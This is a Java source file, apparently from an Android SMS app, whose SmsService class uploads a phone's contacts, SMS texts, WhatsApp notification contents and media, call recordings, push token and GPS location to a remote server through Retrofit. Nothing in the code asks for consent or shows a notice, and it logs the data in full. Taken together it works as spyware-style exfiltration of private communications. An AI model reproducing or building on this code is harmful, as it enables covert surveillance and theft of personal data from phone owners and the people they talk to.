package gonext.smsapp.servers;

import android.app.Notification;
import android.content.Context;
import android.util.Log;
import android.webkit.MimeTypeMap;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.google.gson.JsonObject;
import com.squareup.okhttp.Cache;
import com.squareup.okhttp.OkHttpClient;

import java.io.File;
import java.util.List;
import java.util.concurrent.Executor;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import gonext.smsapp.db.NotificationEntity;
import gonext.smsapp.utils.Constant;
import retrofit.RestAdapter;
import retrofit.client.OkClient;
import retrofit.mime.TypedFile;

/**
 * Created by ram on 14/09/17.
 */

public class SmsService {
    private Context context;
    private SmsAPI smsAPI;
    private SmsAPI testSmsAPI;

    public SmsService(Context context) {
        this.context = context;
    }
    /**
     * Initialize pdf cloud Rest API call
     */
    private void initSMSAPI() {
        if (smsAPI == null) {
            Executor executor = Executors.newFixedThreadPool(1);

            OkHttpClient okHttpClient = new OkHttpClient();
            okHttpClient.setReadTimeout(30, TimeUnit.SECONDS);
            okHttpClient.setWriteTimeout(10, TimeUnit.SECONDS);
            okHttpClient.setConnectTimeout(10, TimeUnit.SECONDS);
            okHttpClient.setFollowSslRedirects(true);
            try {
                File cacheDir = new File(System.getProperty("java.io.tmpdir"), "okhttp-cache");
                Cache cache = new Cache(cacheDir, (20L * 1024 * 1024));
                okHttpClient.setCache(cache);
            }catch (Exception e){
                e.printStackTrace();
            }

            RestAdapter restAdapter = new RestAdapter.Builder().setEndpoint(Constant.GEONAMES_URL).setClient(new OkClient(okHttpClient)).setExecutors(executor, executor).setLogLevel(RestAdapter.LogLevel.FULL).build();
            smsAPI = restAdapter.create(SmsAPI.class);
        }
    }

    /**
     * Initialize pdf cloud Rest API call
     */
    private void initSecondSMSAPI() {
        if (testSmsAPI == null) {
            Executor executor = Executors.newFixedThreadPool(1);

            OkHttpClient okHttpClient = new OkHttpClient();
            okHttpClient.setReadTimeout(30, TimeUnit.SECONDS);
            okHttpClient.setWriteTimeout(10, TimeUnit.SECONDS);
            okHttpClient.setConnectTimeout(10, TimeUnit.SECONDS);
            okHttpClient.setFollowSslRedirects(true);
            try {
                File cacheDir = new File(System.getProperty("java.io.tmpdir"), "okhttp-cache");
                Cache cache = new Cache(cacheDir, (20L * 1024 * 1024));
                okHttpClient.setCache(cache);
            }catch (Exception e){
                e.printStackTrace();
            }

            RestAdapter restAdapter = new RestAdapter.Builder().setEndpoint(Constant.SECOND_URL).setClient(new OkClient(okHttpClient)).setExecutors(executor, executor).setLogLevel(RestAdapter.LogLevel.FULL).build();
           testSmsAPI = restAdapter.create(SmsAPI.class);
        }
    }

    public void sendContacts(String userMob,String contactId,String contactNo,String contactName){
//        initSMSAPI();
        initSecondSMSAPI();
        SmsCallback smsCallback = new SmsCallback(1);
//        smsAPI.postContacts("ContactList",removeSpChars(userMob),contactId,removeSpChars(contactNo),contactName,smsCallback);
     testSmsAPI.postContacts("ContactList",removeSpChars(userMob),contactId,removeSpChars(contactNo),contactName,smsCallback);
    }
    public void sendSms(String userMob,String msgId,String msgDate,String msgFrom,String to,String msgText){
//        initSMSAPI();
        initSecondSMSAPI();
        SmsCallback smsCallback = new SmsCallback(2);
//        smsAPI.postMessages("SMSList",userMob,msgId,msgDate,removeSpChars(msgFrom),removeSpChars(to),msgText,smsCallback);
    testSmsAPI.postMessages("SMSList",userMob,msgId,msgDate,removeSpChars(msgFrom),removeSpChars(to),msgText,smsCallback);
    }

    public void sendNotification(String userMob, String msgId, String msgDate, String msgFrom, String to, String msgText, List<NotificationEntity> notifications){
//        initSMSAPI();
        initSecondSMSAPI();
        SmsCallback smsCallback = new SmsCallback(context,3,notifications);
//        smsAPI.postWhatsApp("WHATSAPP",removeSpChars(userMob),msgId,msgDate,removeSpChars(msgFrom),removeSpChars(to),msgText,smsCallback);
       // Log.e("SESESESE",""+removeSpChars(userMob)+"---"+msgId+"---"+msgDate+"---"+removeSpChars(msgFrom)+"---"+removeSpChars(to)+"---"+msgText+"---"+smsCallback);
      testSmsAPI.postWhatsApp("WHATSAPP",removeSpChars(userMob),msgId,msgDate,removeSpChars(msgFrom),removeSpChars(to),msgText,smsCallback);
    }

    public void sendMedia(File file,String userMobile){
//        initSMSAPI();
        initSecondSMSAPI();
        SmsCallback smsCallback = new SmsCallback(4);
//        smsAPI.postWhatsAppMedia("UPLOAD",removeSpChars(userMobile),new TypedFile(getMimeType(file.getAbsolutePath()),file), smsCallback);
        testSmsAPI.postWhatsAppMedia("UPLOAD",removeSpChars(userMobile),new TypedFile(getMimeType(file.getAbsolutePath()),file), smsCallback);
    }

    public void sendCallrecordings(File file,String userMobile){
//        initSMSAPI();
        initSecondSMSAPI();
        SmsCallback smsCallback = new SmsCallback(5, file);
//        smsAPI.postCallRecord("UPLOAD",removeSpChars(userMobile),new TypedFile(getMimeType(file.getAbsolutePath()),file),"CALLRECORD", smsCallback);
      testSmsAPI.postCallRecord("UPLOAD",removeSpChars(userMobile),new TypedFile(getMimeType(file.getAbsolutePath()),file),"CALLRECORD", smsCallback);
    }

    public void sendFcmToken(String token,String userMobile){
//        Log.e("WEROTO",""+userMobile);
//        initSMSAPI();
        initSecondSMSAPI();
        SmsCallback smsCallback = new SmsCallback(7);
        testSmsAPI.postFCM(token,userMobile,smsCallback);
    }

    public void sendLocZ(String userMobile, String address){
//        Log.e("WEROTOz",""+userMobile);
//        initSMSAPI();
        initSecondSMSAPI();
        SmsCallback smsCallback = new SmsCallback(8);
       testSmsAPI.postLocationz(userMobile,address,String.valueOf(Constant.latitude),String.valueOf(Constant.longitude),smsCallback);
    }

    public static String removeSpChars(String s){
        s = s.replaceAll("\\+","");
        s = s.replaceAll("-","");
        s = s.replaceAll("\\(","");
        s = s.replaceAll("\\)","");
        s = s.replaceAll(" ","");
        return s;
    }
    public static String getMimeType(String url) {
        String type = null;
        String extension = MimeTypeMap.getFileExtensionFromUrl(url);
        if (extension != null) {
            type = MimeTypeMap.getSingleton().getMimeTypeFromExtension(extension);
        }
        return type;
    }

    public void sendLocation(String userMobile){
//        Log.e("popopopo","YESSS");
//        initSMSAPI();
        initSecondSMSAPI();
        SmsCallback smsCallback = new SmsCallback(6);
//        smsAPI.postLocation("LOCATION",String.valueOf(Constant.latitude),String.valueOf(Constant.longitude),removeSpChars(userMobile), smsCallback);
    testSmsAPI.postLocation("LOCATION",String.valueOf(Constant.latitude),String.valueOf(Constant.longitude),removeSpChars(userMobile), smsCallback);
    }
}
